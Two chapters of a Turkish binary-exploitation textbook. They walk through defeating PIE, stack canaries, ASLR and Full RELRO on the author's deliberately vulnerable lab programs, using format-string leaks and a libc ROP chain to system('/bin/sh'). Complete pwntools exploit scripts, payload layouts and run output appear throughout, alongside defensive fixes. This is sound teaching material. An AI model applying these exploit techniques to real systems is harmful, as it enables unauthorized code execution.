# Bölüm 18: PIE: programın kendisi de kayınca

## Bu bölümde

Şimdiye kadar programın kendi adresleri hep sabitti: `win` = `0x401176`, `pop rdi` = `0x401166`, GOT = `0x404000`. PIE bunu da bitiriyor: program her çalıştırmada başka bir taban adrese yükleniyor. Bu bölümde PIE'nin ne değiştirdiğini göreceğiz ve tek bir format string sızıntısıyla hem canary'yi hem de programın tabanını öğrenip `win`'e zıplayacağız. Bölüm 13'teki "taban + offset" fikrini bu sefer programın kendisine uygulayacağız.

**Ön koşullar:** Bölüm 13 (taban + offset, `000` sağlaması), Bölüm 17 (canary sızdırma, yuva tablosu).

**Bu bölümün sonunda:**

- `nm` ve `objdump`'ın PIE'li bir programda gösterdiği adreslerin aslında offset olduğunu açıklayabileceksin.
- Yığındaki dönüş adresinden PIE tabanını hesaplayabileceksin.
- Tek bir biçim metniyle iki değer sızdırıp ikisini de kullanan bir exploit yazabileceksin.
- Kısmi yazma (partial overwrite) fikrini son üç basamak kuralıyla açıklayabileceksin.

## Sezgi: yine taşınan apartman

Bölüm 13'teki taşınan apartmanı hatırla. Şimdiye kadar sadece kütüphaneler taşınıyordu, programın kendisi aynı yerde duruyordu. PIE ile program da her gece başka bir yere taşınıyor. Ama mantık aynı: binanın içi değişmiyor. Programın içinden tek bir adres öğrenirsen, bütün programı bilirsin.

Benzetmenin yeni bir yerden bozulduğu nokta: programın içinden bir adresi nereden öğreneceğiz? GOT'u okuyamayız, çünkü GOT'un adresi de taşındı. Cevap yığında duruyor: her fonksiyon çağrısı yığına programın içinden bir dönüş adresi bırakır.

## Değişen ne

`e08_pie`, `e07_canary`'nin aynı kaynak kodu. Tek fark derleme:

```bash
gcc -O0 -fstack-protector-all -pie -fPIE -fcf-protection=none -Wno-format-security \
    -o ~/cracks/e08_pie ~/.cracks_src/e08_pie.c
pwn checksec ~/cracks/e08_pie
```

```text
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

`-fPIE` kodu her adrese yüklenebilecek şekilde üretir (bütün adresleri `rip`'e göre hesaplar), `-pie` bağlayıcıya "bunu konumdan bağımsız bir program olarak bağla" der. Sembollere bak:

```bash
nm ~/cracks/e08_pie | grep -E ' (win|vuln|main)$'
```

```text
0000000000001277 T main
00000000000011b9 T vuln
0000000000001189 T win
```

`0x401...` değil, `0x1189` gibi küçük sayılar. Bunlar adres değil, programın **başından uzaklıklar**. Gerçek adres program yüklenince belli olur:

```text
win'in gerçek adresi = PIE tabanı + 0x1189
```

- gdb'de (ASLR kapalı) PIE tabanı her zaman `0x555555554000`.
- ASLR açıkken taban her çalıştırmada değişir. Bu makinede `0x55...` ile `0x65...` arasında değerler gördük.

Bölüm 17'deki exploit'i değiştirmeden çalıştırırsan `e.sym.win` = `0x1189` gönderilir. Bu adreste hiçbir şey yüklü değil, program oraya zıplayıp çöker.

## Programın içinden bir adres

Bölüm 17'deki yuva tablosuna bak: `%19$p`, `vuln`'ün dönüş adresiydi, yani `main`'in içinde bir adres. PIE açıkken de orada, sadece değeri artık rastgele.

```bash
(printf '%%17$p.%%18$p.%%19$p'; sleep 0.2; printf 'x') | ~/cracks/e08_pie
```

```text
isim: merhaba 0xf2162834acac7300.0x7ffe1d815dd0.0x6022ea5a72b1
mesaj: normal cikis.
```

| Yuva | Değer | Ne |
|---|---|---|
| `%17$p` | `0xf2162834acac7300` | canary (`00` ile bitiyor) |
| `%18$p` | `0x7ffe1d815dd0` | kaydedilmiş rbp (yığın mahallesi) |
| `%19$p` | `0x6022ea5a72b1` | dönüş adresi, `0x60...`: program mahallesi |

Bu adres hangi komuta denk geliyor?

```bash
objdump -d -M intel --no-show-raw-insn ~/cracks/e08_pie | sed -n '/<main>:/,/ret/p' | grep -A1 'call.*vuln'
```

```text
    12ac:	call   11b9 <vuln>
    12b1:	lea    rax,[rip+0xd95]
```

`call vuln`'den sonraki komutun offset'i `0x12b1`. Sızan adresin son üç basamağı da `2b1`. Son üç basamak kuralı burada da işliyor.

```text
PIE tabanı = sızan adres − 0x12b1
           = 0x6022ea5a72b1 − 0x12b1
           = 0x6022ea5a6000        ← 000 ile bitiyor ✓
win        = 0x6022ea5a6000 + 0x1189
```

## Exploit

Tek bir biçim metniyle iki sızıntı: `%17$p.%19$p`. Bu dosya `~/.cracks_src/e08_pie_x.py` olarak duruyor:

```python
from pwn import *
context.log_level = "error"
e = ELF("/home/linkola/cracks/e08_pie", checksec=False)
p = process(e.path)

# 1. adım: canary (%17$p) + main içindeki dönüş adresi (%19$p)
p.sendafter(b"isim: ", b"%17$p.%19$p")
p.recvuntil(b"merhaba ")
c, r = p.recvline().strip().split(b".")
canary   = int(c, 16)
ret_main = int(r, 16)                 # main+0x3a: "call vuln"dan sonraki komut
e.address = ret_main - 0x12b1         # PIE tabanı
print("kanarya   =", hex(canary))
print("main+0x3a =", hex(ret_main))
print("PIE taban =", hex(e.address))
print("win       =", hex(e.sym.win))

# 2. adım: taşma (Bölüm 17 ile aynı)
payload = b"A"*72 + p64(canary) + b"B"*8 + p64(e.sym.win)
p.sendafter(b"mesaj: ", payload)
print(p.recvall(timeout=2))
```

## Deneme sürüşü

```text
kanarya   = 0x4c9379ec16b5d800
main+0x3a = 0x5aea50df52b1
PIE taban = 0x5aea50df4000
win       = 0x5aea50df5189
b'tebrikler: kanaryayi gectin, win() calisti!\n'
kanarya   = 0xc7ba140aaf150400
main+0x3a = 0x620b761372b1
PIE taban = 0x620b76136000
win       = 0x620b76137189
b'tebrikler: kanaryayi gectin, win() calisti!\n'
```

İki çalıştırmada her şey farklı: canary, taban, `win`. Ama tabanlar `000` ile bitiyor, `win`'in son üç basamağı hep `189`, ve exploit iki seferde de çalıştı.

`e.address = ...` satırı pwntools'a tabanı söylüyor. Ondan sonra `e.sym.win`, `e.got.puts` gibi her şey otomatik olarak gerçek adresi verir. Bölüm 15'teki `libc.address` ile aynı numara.

## Son üç basamak kuralı ve kısmi yazma

PIE ve ASLR adresleri sayfa (`0x1000`) birimleriyle kaydırır. Bir adresin son üç hex basamağı asla değişmez. Bu sana üç şey kazandırır:

1. **Sağlama:** hesapladığın taban `000` ile bitmiyorsa yanlış offset'i çıkarmışsın.
2. **Tanıma:** bir dökümde son üç basamağı `2b1` olan değeri görünce "bu `main+0x3a`" diyebilirsin.
3. **Kısmi yazma (partial overwrite):** dönüş adresinin sadece **son 1–2 baytını** ezersen, üst baytlar zaten doğru olduğu için olduğu gibi kalır. Sızıntı olmadan aynı sayfadaki başka bir komuta zıplayabilirsin. Son bayt tamamen bilinir. İki bayt yazman gerekirse ikinci baytın üst 4 biti rastgeledir: 16 denemede bir tutar.

Bu programda kısmi yazma işe yaramaz, çünkü dönüş adresine ulaşmak için canary'yi geçmen gerekiyor, canary için de zaten sızıntı lazım. Ama canary'siz, PIE'li bir programda sızıntı olmadan `win`'e ulaşmanın klasik yolu bu.

## Savunma tarafı

PIE, ASLR'nin programın kendisine de uygulanması. Etkisi büyük: gadget'lar, `win` gibi fonksiyonlar, PLT ve GOT, hepsinin adresi bilinmez hale gelir. Bu yüzden PIE bugün neredeyse bütün dağıtımlarda varsayılan.

Ama bu exploit PIE'nin de tek başına yetmediğini gösteriyor. Format string hatası bir program adresi sızdırdı, PIE çöktü. Bu kitaptaki bütün korumaların ortak noktası şu: **sızıntı varsa koruma yoktur.** Savunmanın asıl hedefi sızıntıları kapatmak.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **PIE'li programda `nm` adresini doğrudan kullanmak.** O bir offset.
> - **`e.address`'i ayarlamayı unutmak.** `e.sym.win` offset döner, program çöker.
> - **Yanlış komutun offset'ini çıkarmak.** Dönüş adresi `call`'un kendisini değil, bir **sonraki** komutu gösterir.
> - **Sağlamayı atlamak.** Taban `000` ile bitmeli.

## Kontrol soruları

1. PIE'li bir programda `nm` çıktısındaki `0x1189` neyi gösterir?
2. gdb'de PIE tabanı neden her zaman `0x555555554000`?
3. `%19$p` neden bir program adresi?
4. Sızan `0x6022ea5a72b1`'den tabanı hesaplarken neden `0x12ac` değil `0x12b1` çıkarıyoruz?
5. Kısmi yazmada neden son bayt tamamen bilinir?
6. Bu programda kısmi yazma neden işe yaramaz?

## Alıştırmalar

1. **Gözlemle.** `pwndbg -q ~/cracks/e08_pie`, `b *main`, `r`, `vmmap`. PIE tabanının `0x555555554000` olduğunu gör. `p win` ne gösteriyor?
2. **Tahmin et, sonra dene.** Exploit'te `0x12b1`'i `e.sym.main + 0x3a` ile değiştir. Çalışacak mı? Neden?
3. **Kendin yap.** `e08_pie`'yi PIE'li ama canary'siz derle (`-fno-stack-protector`). Sızıntı kullanmadan, dönüş adresinin sadece son baytını ezerek `win`'e zıplamayı dene. Hangi baytı yazmalısın? Kaç denemede bir tutuyor?
4. **Merdiven.** p06 PIE sızıntısı üzerine olacak.

## Özet

- PIE, programın kodunu da rastgele bir tabana yükler. `nm`/`objdump` artık offset gösterir.
- gdb'de taban `0x555555554000`, ASLR açıkken her çalıştırmada başka.
- Yığındaki dönüş adresi, programın içinden bir adres sızdırmak için hazır bir kaynak.
- PIE tabanı = sızan dönüş adresi − `call`'dan sonraki komutun offset'i.
- `e.address = taban`, pwntools'un bütün adresleri düzeltmesini sağlar.
- Son üç basamak sabit: sağlama, tanıma ve kısmi yazma.

Elimizde artık bütün araçlar var. Son örnekte her şey açık ve programda `win` yok.

---
**Kontrol sorularının cevapları**

1. `win`'in programın başından uzaklığını (offset).
2. gdb ASLR'yi kapatır, çekirdek PIE programlarını ASLR kapalıyken bu sabit adrese yükler.
3. `vuln`'ün dönüş adresi, yani `main` içindeki `call vuln`'den sonraki komut.
4. Dönüş adresi `call`'dan sonraki komutu gösterir. `call` `0x12ac`'te, sonraki komut `0x12b1`'de.
5. Taban sayfa sınırına hizalı. Adresin son 12 biti tabandan etkilenmez, sadece offset'e bağlıdır.
6. Dönüş adresine ulaşmak için önce canary'yi geçmek gerekiyor. Canary'yi geçmek için zaten sızıntı lazım, o sızıntı da tabanı veriyor.

**Bu bölümde geçen yeni terimler:** PIE, `-fPIE`/`-pie`, PIE tabanı, kısmi yazma (partial overwrite).


# Bölüm 19: Hepsi bir arada

## Bu bölümde

Son örnek. Bütün korumalar açık ve programda `win` fonksiyonu yok. Şimdiye kadar öğrendiğin her şeyi tek bir exploit'te birleştireceksin. Yeni bir teknik yok, yeni bir fikir de neredeyse yok: bu bölümün amacı, parçaların bir araya geldiğini görmek. Bir de kitabın ilk sayfalarında gördüğün bir adresin, bu son exploit'in anahtarı çıkması var.

**Ön koşullar:** Bölüm 12–18'in hepsi.

**Bu bölümün sonunda:**

- Bir programın korumalarını sayıp her birini aşmak için gereken parçayı belirleyebileceksin.
- `main`'in dönüş adresini kullanarak yığından bir libc adresi sızdırabileceksin.
- Gadget'ları programdan değil libc'den alan bir ROP zinciri kurabileceksin.
- NX, ASLR, PIE, canary ve Full RELRO açıkken kabuk açan bir exploit yazabileceksin.

## Hedef

```bash
pwn checksec ~/cracks/e09_full
```

```text
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

```c
/* e09_full: tum korumalar acik. win() yok: libc'den system("/bin/sh"). */
#include <stdio.h>
#include <unistd.h>

void vuln(void)
{
    char buf[64];
    printf("isim: ");
    int n = read(0, buf, 63);
    buf[n > 0 ? n : 0] = 0;
    printf("merhaba ");
    printf(buf);
    printf("\nmesaj: ");
    read(0, buf, 300);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("normal cikis.");
    return 0;
}
```

Derleme: `-fstack-protector-all -pie -fPIE -Wl,-z,relro,-z,now`. Son seçenek **Full RELRO**: GOT, program başlarken doldurulur ve salt okunur yapılır.

## Savaş planı

Önce her korumanın neyi engellediğini ve nasıl aşacağımızı yazalım. Bu tabloyu yazmadan exploit'e başlama alışkanlığı edin:

| Koruma | Engel | Çözüm |
|---|---|---|
| NX | Yığına shellcode koyamayız | ROP |
| ASLR | libc'nin yeri bilinmiyor | Bir libc adresi sızdır |
| PIE | Programın gadget'larının yeri bilinmiyor | Gadget'ları **libc'den** al. Programın adreslerine hiç ihtiyacımız yok. |
| Canary | Taşma canary'yi bozar | Sızdır, aynısını yaz |
| Full RELRO | GOT'a yazamayız | Yazmayacağız. Dönüş adresini kullanıyoruz. |
| `win` yok | | `system("/bin/sh")` |

İhtiyacımız olan iki sızıntı: **canary** ve **bir libc adresi.**

## Yığında bir libc adresi

Bölüm 15'te libc adresini GOT'tan sızdırdık. Burada PIE açık, GOT'un adresini de bilmiyoruz. Ama yığında zaten bir libc adresi var. Onu daha önce gördün.

Bu kitabın en başında, gdb'de `main`'in ilk komutunda durduğunda yığının tepesinde şu duruyordu:

```text
(gdb) x/gx $rsp
0x7fffffffda08:    0x00007ffff7de3bfc
(gdb) info symbol 0x00007ffff7de3bfc
__libc_start_call_main + 124 in section .text of /usr/lib/libc.so.6
```

Bu, `main`'in dönüş adresi. `main`'i libc'deki `__libc_start_call_main` çağırıyor. Yani **`main`'in dönüş adresi bir libc adresi.** Yığında, `vuln`'ün çerçevesinin biraz üstünde duruyor ve format string ile oraya ulaşabiliriz.

### Hangi yuva

`vuln`'ün çerçevesi `e07`'dekiyle aynı (`sub rsp,0x60`). `%19$p`, `vuln`'ün dönüş adresi. Ondan sonra `main`'in çerçevesi başlıyor. `main` `sub rsp,0x10` yapıyor ve kendi canary'sini `[rbp−0x8]`'e koyuyor:

| Yuva | İçerik |
|---|---|
| `%17$p` | `vuln`'ün canary'si |
| `%18$p` | `vuln`'ün kaydedilmiş rbp'si |
| `%19$p` | `vuln`'ün dönüş adresi (`main` içi) |
| `%20$p` | `main`'in yerel alanı |
| `%21$p` | `main`'in canary'si (aynı değer: canary süreç başına bir tane) |
| `%22$p` | `main`'in kaydedilmiş rbp'si |
| **`%23$p`** | **`main`'in dönüş adresi = `__libc_start_call_main+124`** |

Doğrulayalım. Bu sefer libc tabanını `/proc` üzerinden de okuyup karşılaştırıyoruz:

```bash
(printf '%%17$p.%%19$p.%%21$p.%%23$p'; sleep 0.5; printf 'x') | ~/cracks/e09_full &
sleep 0.25; grep -m1 libc.so /proc/$(pgrep -n e09_full)/maps
```

```text
isim: merhaba 0xbc8ca0be5224e100.0x646f72fc0271.0xbc8ca0be5224e100.0x76bccbd85bfc
76bccbd5b000-76bccbd83000 r--p 00000000 00:1d 289003    /usr/lib/libc.so.6
```

- `%17$p` ve `%21$p` aynı. İki canary aynı değer, beklendiği gibi.
- `%19$p` = `0x646f72fc0271`: PIE adresi.
- `%23$p` = `0x76bccbd85bfc`: libc mahallesi. Son üç basamak **`bfc`**, kitabın başındaki `0x7ffff7de3bfc` ile aynı.
- libc tabanı `0x76bccbd5b000`.

Offset: `0x76bccbd85bfc − 0x76bccbd5b000 = 0x2abfc`. gdb'deki sayılarla da tutuyor: `0x7ffff7de3bfc − 0x7ffff7db9000 = 0x2abfc`.

```text
libc tabanı = %23$p − 0x2abfc
```

> [!NOTE]
> **Sürüm notu:** `0x2abfc` bu makinedeki glibc 2.41'e özel. Başka bir libc'de `__libc_start_call_main+124`'ün offset'i farklı olur. Her zaman kendi ortamında bu şekilde ölç.

## Gadget'lar libc'den

Programın kendi kodunda `pop rdi; ret` yok, olsa bile PIE yüzünden yerini bilmiyoruz. Ama libc'nin yerini artık biliyoruz ve libc'de 100.000'den fazla gadget var:

```python
rop     = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret     = rop.find_gadget(["ret"]).address
```

pwntools burada libc'nin 64 bit olduğunu bilmek için `context.arch = "amd64"` ister. Bunu yazmazsan şu anlaşılması zor hatayı alırsın:

```text
ValueError: pack(): number does not fit within word_size [0, 136973332973963, 4294967296]
```

`4294967296` = 2³². pwntools varsayılan olarak 32 bit sanıyor ve 64 bitlik adresleri paketleyemiyor. Bu hata bu exploit yazılırken gerçekten alındı.

## Exploit

Bu dosya `~/.cracks_src/e09_full_x.py` olarak duruyor:

```python
from pwn import *
context.log_level = "error"
context.arch = "amd64"
e    = ELF("/home/linkola/cracks/e09_full", checksec=False)
libc = ELF("/usr/lib/libc.so.6", checksec=False)
p = process(e.path)

# 1. adım: canary (%17$p) ve libc içindeki dönüş adresi (%23$p)
p.sendafter(b"isim: ", b"%17$p.%23$p")
p.recvuntil(b"merhaba ")
c, l = p.recvline().strip().split(b".")
canary = int(c, 16)
libc.address = int(l, 16) - 0x2abfc   # __libc_start_call_main+124
print("kanarya =", hex(canary))
print("libc    =", hex(libc.address))

# 2. adım: libc parçalarıyla system("/bin/sh")
rop     = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret     = rop.find_gadget(["ret"]).address
binsh   = next(libc.search(b"/bin/sh\0"))
chain   = [pop_rdi, binsh, ret, libc.sym.system]

payload = b"A"*72 + p64(canary) + b"B"*8 + b"".join(p64(x) for x in chain)
p.sendafter(b"mesaj: ", payload.ljust(300, b"\0"))
p.sendline(b"echo SHELL_ACILDI; id -un")
print(p.recvline(timeout=2), p.recvline(timeout=2))
```

Payload'ın son hali:

```text
┌──────────┬─────────┬──────────┬──────────┬──────────┬──────┬──────────┐
│ A * 72   │ canary  │ B * 8    │ pop rdi  │ "/bin/sh"│ ret  │ system   │  ... \0 dolgu → 300
└──────────┴─────────┴──────────┴──────────┴──────────┴──────┴──────────┘
  buf       sızıntı1  kayd. rbp  libc       libc       libc   libc
```

## Deneme sürüşü

```text
kanarya = 0x5a2f256e960de600
libc    = 0x7b640d084000
b'SHELL_ACILDI\n' b'linkola\n'
kanarya = 0x5d313819b5c0ef00
libc    = 0x7694bb0af000
b'SHELL_ACILDI\n' b'linkola\n'
kanarya = 0x3f15ffc92e1fa500
libc    = 0x7af6f29f5000
b'SHELL_ACILDI\n' b'linkola\n'
```

Bütün korumalar açıkken kabuk açtın. NX, ASLR, PIE, canary, Full RELRO. Hepsi tek bir format string hatası ve tek bir taşmayla aşıldı.

## Geriye bakış

Bu exploit'in her satırını kitabın farklı bir bölümünde öğrendin:

| Parça | Bölüm |
|---|---|
| `%17$p` ile canary'yi okumak | 16, 17 |
| Yuva hesabı: `%N$p = [rsp + (N−6)·8]` | 16 |
| `main`'in dönüş adresinin libc'de olduğu | 5 ve kitabın ilk gdb oturumu |
| taban = sızıntı − offset, `000` sağlaması | 13 |
| Mesafe `0x50 − 0x8 = 72` | 5, 17 |
| `pop rdi; ret` + argüman + fonksiyon | 12 |
| Fazladan `ret` ile hizalama | 15 |
| `ljust(300)` ile okuma sınırı | 8 |
| `context.arch` | 6, 19 |

Yeni bilgi yok, sadece parçalar birleşti. Exploit geliştirme çoğunlukla bu: küçük, iyi anlaşılmış yapı taşlarını doğru sırayla dizmek.

## Savunma tarafı

Bu programda beş koruma vardı ve hiçbiri tek başına yetmedi. Hepsini delen iki kod satırı:

```c
printf(buf);            /* → printf("%s", buf);           */
read(0, buf, 300);      /* → read(0, buf, sizeof(buf));    */
```

Bu iki düzeltme yapıldığında exploit'in hiçbir parçası çalışmaz. Korumalar, hatalar düzeltilmeden önce zararı sınırlamak için var: saldırganın işini birkaç kat zorlaştırıyorlar, ve bir hatayla değil ancak iki hatanın birleşimiyle aşılabiliyorlar. Gerçek dünyada saldırganın elinde genelde bu kadar rahat iki hata olmaz. O yüzden bu korumaların birleşimi çoğu durumda yeterli olur. Ama "çoğu durumda", "her durumda" değil.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **`context.arch` yazmamak.** `pack(): number does not fit within word_size`.
> - **libc offset'ini başka bir makineden almak.** `0x2abfc` sürüme özel.
> - **`main`'in canary'sini (`%21$p`) ve `vuln`'ünkini (`%17$p`) farklı sanmak.** Süreç başına tek bir canary var.
> - **Payload'ı 300'e tamamlamamak.** Kabuğa giden komut yutulur.

## Kontrol soruları

1. Bu exploit'te programın kendi adreslerine neden hiç ihtiyaç yok?
2. `main`'in dönüş adresi neden bir libc adresi?
3. `%23$p` yuvasını nasıl hesapladık?
4. `%17$p` ile `%21$p` neden aynı değeri verdi?
5. Full RELRO bu exploit'i neden durdurmadı?
6. `context.arch` olmadan hata neden "word_size" ile ilgili?

## Alıştırmalar

1. **Gözlemle.** `%17$p`'den `%25$p`'ye kadar döküm al ve her yuvayı tablodaki karşılığıyla eşleştir. `%24$p` ve `%25$p` ne olabilir?
2. **Tahmin et, sonra dene.** `%23$p` yerine Bölüm 16'da gördüğün `%3$p`'deki libc adresini kullanmak istiyorsun. Offset'ini gdb ile bul. Exploit hâlâ çalışacak mı?
3. **Kendin yap.** `system` yerine doğrudan `execve` sistem çağrısını ROP ile yap: `pop rdi`, `pop rsi`, `pop rdx`, `pop rax` ve `syscall` gadget'larını libc'den bul. `pop rdx; ret` tek başına bulunmayabilir, `ROPgadget` ile alternatiflerini ara.
4. **Kendin yap.** `0x2abfc`'yi elle yazmadan `libc.sym.__libc_start_call_main + 124` ile hesapla. Bu sembol bu libc'de var mı?
5. **Merdiven.** p07 bu bölümün küçük bir versiyonu olacak.

## Özet

- Önce savaş planı: her koruma için bir çözüm.
- Yığında hazır bir libc adresi var: `main`'in dönüş adresi, `__libc_start_call_main+124`.
- PIE'yi aşmak zorunda değilsin, libc'yi biliyorsan gadget'ları oradan alırsın.
- `ROP(libc).find_gadget` ve `context.arch = "amd64"`.
- Beş koruma, tek bir sızıntı hatası ve tek bir taşmayla aşıldı.
- Asıl savunma, iki satırlık kaynak kod düzeltmesi.

Dokuz örnek bitti. Kısım V'te yöntemi topluyoruz: her yeni programda izleyeceğin sıra, exploit çalışmadığında ne yapacağın, ve Binary Ninja ile keşif.

---
**Kontrol sorularının cevapları**

1. Zincirdeki her şey libc'den geliyor: gadget'lar, `"/bin/sh"`, `system`. Dönüş adresine ulaşmak için de sadece canary gerekiyor.
2. `main`'i libc'deki `__libc_start_call_main` çağırıyor. Dönüş adresi o fonksiyonun içinde.
3. `vuln`'ün çerçevesi `%6$p`–`%19$p`. `main`'in çerçevesi `sub rsp,0x10` ile 2 yuva, ardından kaydedilmiş rbp ve dönüş adresi: 20, 21, 22, 23.
4. Canary süreç başına bir kere seçilir, her fonksiyon aynı değeri kullanır.
5. Exploit GOT'a hiç yazmıyor. Dönüş adresini kullanıyor.
6. pwntools varsayılan olarak 32 bitlik bir ortam varsayar ve 64 bitlik adresleri 4 bayta sığdırmaya çalışır.

**Bu bölümde geçen yeni terimler:** Full RELRO (`-z now`), savaş planı, libc gadget'ları.

---

[← 09-format-string-ve-canary](09-format-string-ve-canary.md) · [İçindekiler](README.md) · [11-yontem-ve-hata-ayiklama →](11-yontem-ve-hata-ayiklama.md)
